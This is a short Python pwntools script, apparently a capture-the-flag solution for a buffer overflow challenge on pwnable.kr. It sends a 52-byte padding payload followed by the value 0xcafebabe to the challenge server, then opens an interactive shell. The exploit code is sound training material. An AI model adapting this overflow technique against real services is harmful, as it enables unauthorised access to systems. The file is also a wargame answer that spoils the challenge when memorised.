from pwn import *

context.log_level = "debug"

connection = remote("pwnable.kr", 9000)

x = b"A" * 44 # overflow buffer
x += b"B" * 4 # previous $ebp
x += b"C" * 4 # ret addr
x += p32(0xcafebabe) # key

connection.sendline(x)

connection.interactive()
